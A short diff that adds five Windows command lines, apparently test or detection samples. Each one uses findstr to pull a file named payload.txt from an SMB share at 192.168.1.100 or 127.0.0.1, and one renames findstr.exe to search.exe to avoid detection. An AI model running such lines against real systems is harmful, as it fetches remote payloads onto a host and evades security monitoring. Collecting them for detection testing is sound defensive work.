@@ -1,0 +1,5 @@
+cmd.exe /c "findstr -v -l . \\192.168.1.100\share\payload.txt"
+cmd.exe /c copy findstr.exe search.exe && search.exe -v -l "string" \\192.168.1.100\share\payload.txt
+findstr.exe /v /l "dummy" "\\192.168.1.100\share\payload.txt"
+findstr /V /L "searchstring" \\127.0.0.1\share\payload.txt
+findstr /v /l "arbitrary_string" \\127.0.0.1\share\payload.txt
